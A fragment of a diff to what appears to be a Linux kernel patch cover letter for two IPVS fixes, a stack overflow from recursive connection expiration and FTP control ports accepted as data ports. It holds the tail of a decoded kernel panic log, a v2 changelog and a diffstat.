+[   68.763958]  ? __ip_vs_cleanup_batch (ip_vs_core.c:?)
+[   68.763958]  ? __pfx___ip_vs_cleanup_batch (usercopy_64.c:?)
+[   68.763958]  ? ops_undo_list (net_namespace.c:?)
+[   68.763958]  ? __pfx_ops_undo_list (usercopy_64.c:?)
+[   68.763958]  ? idr_destroy (??:?)
+[   68.763958]  ? _raw_spin_lock (??:?)
+[   68.763958]  ? cleanup_net (net_namespace.c:?)
+[   68.763958]  ? __pfx_cleanup_net (usercopy_64.c:?)
+[   68.763958]  ? __switch_to (??:?)
+[   68.763958]  ? kick_pool_pick (workqueue.c:?)
+[   68.763958]  ? __schedule (core.c:?)
+[   68.763958]  ? process_scheduled_works (workqueue.c:?)
+[   68.763958]  ? __pfx_process_scheduled_works (usercopy_64.c:?)
+[   68.763958]  ? __pfx_cleanup_net (usercopy_64.c:?)
+[   68.763958]  ? assign_work (workqueue.c:?)
+[   68.763958]  ? worker_thread (workqueue.c:?)
+[   68.763958]  ? __pfx_worker_thread (usercopy_64.c:?)
+[   68.763958]  ? kthread (kthread.c:?)
+[   68.763958]  ? __pfx_kthread (usercopy_64.c:?)
+[   68.763958]  ? ret_from_fork (??:?)
+[   68.763958]  ? __pfx_ret_from_fork (??:?)
+[   68.763958]  ? native_load_tls (paravirt.c:?)
+[   68.763958]  ? native_load_gs_index (paravirt.c:?)
+[   68.763958]  ? __switch_to (??:?)
+[   68.763958]  ? __pfx_kthread (usercopy_64.c:?)
+[   68.763958]  ? ret_from_fork_asm (??:?)
+[   68.763958]  </TASK>
+[   68.763958] Modules linked in:
+[   68.763958] ---[ end trace 0000000000000000 ]---
+[   68.763958] RIP: 0010:_raw_spin_lock_irqsave (??:?)
+[   68.763958] Code: 0f 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 55 48 89 e5 41 55 41 54 49 89 fc 53 48 8d 5d 88 48 c1 eb 03 48 01 d8 48 83 ec 60 <48> c7 45 88 b3 8a b5 41 48 c7 45 90 52 b6 6a 85 48 c7 45 98 e0 f2
+All code
+========
+   0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+   5:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
+   c:	fc ff df 
+   f:	55                   	push   %rbp
+  10:	48 89 e5             	mov    %rsp,%rbp
+  13:	41 55                	push   %r13
+  15:	41 54                	push   %r12
+  17:	49 89 fc             	mov    %rdi,%r12
+  1a:	53                   	push   %rbx
+  1b:	48 8d 5d 88          	lea    -0x78(%rbp),%rbx
+  1f:	48 c1 eb 03          	shr    $0x3,%rbx
+  23:	48 01 d8             	add    %rbx,%rax
+  26:	48 83 ec 60          	sub    $0x60,%rsp
+  2a:*	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)		<-- trapping instruction
+  31:	41 
+  32:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
+  39:	85 
+  3a:	48                   	rex.W
+  3b:	c7                   	.byte 0xc7
+  3c:	45 98                	rex.RB cwtl 
+  3e:	e0 f2                	loopne 0x32
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)
+   7:	41 
+   8:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
+   f:	85 
+  10:	48                   	rex.W
+  11:	c7                   	.byte 0xc7
+  12:	45 98                	rex.RB cwtl 
+  14:	e0 f2                	loopne 0x8
+[   68.763958] RSP: 0018:ffffc900008d7fc0 EFLAGS: 00000286
+[   68.763958] RAX: fffff5200011aff8 RBX: 1ffff9200011aff8 RCX: dffffc0000000000
+[   68.763958] RDX: 1ffffffff0b02a1c RSI: ffffc900008d80c0 RDI: ffff88806ce2f440
+[   68.763958] RBP: ffffc900008d8038 R08: 1ffff11002d4aa47 R09: ffffed1002d4aa48
+[   68.763958] R10: ffffed1002d4aa47 R11: ffff888016a5523b R12: ffff88806ce2f440
+[   68.763958] R13: ffff888016a552c0 R14: ffffed1002d4aa5c R15: 0000000000001280
+[   68.763958] FS:  0000000000000000(0000) GS:ffff8880e57b9000(0000) knlGS:0000000000000000
+[   68.763958] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   68.763958] CR2: ffffc900008d7fb8 CR3: 0000000005aa8000 CR4: 00000000000006f0
+[   68.763958] Kernel panic - not syncing: Fatal exception in interrupt
+[   68.763958] Kernel Offset: disabled
+[   68.763958] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
+-----END crash log-----
+
+changes in v2:
+  - Use a repeat path for controller cleanup so expiration stays
+    synchronous without recursive calls or extra timer ticks.
+  - Extend the FTP-helper fix to active mode by rejecting the data port
+    derived from a configured control port.
+  - Replace the reproducer and crash evidence with the original passive
+    shell/Python PoC and the decoded stack-guard-page log from the a401
+    baseline.
+  - v1 Link:
+    https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/
+
+Best regards,
+Zihan Xi
+Zihan Xi (2):
+  ipvs: avoid stack overflow from recursive connection expiration
+  ipvs: reject FTP control ports as data ports
+
+ net/netfilter/ipvs/ip_vs_conn.c | 17 ++++++++++++-----
+ net/netfilter/ipvs/ip_vs_ftp.c  | 18 ++++++++++++++++++
+ 2 files changed, 30 insertions(+), 5 deletions(-)
+
 -- 
-2.51.0
-
+2.43.0
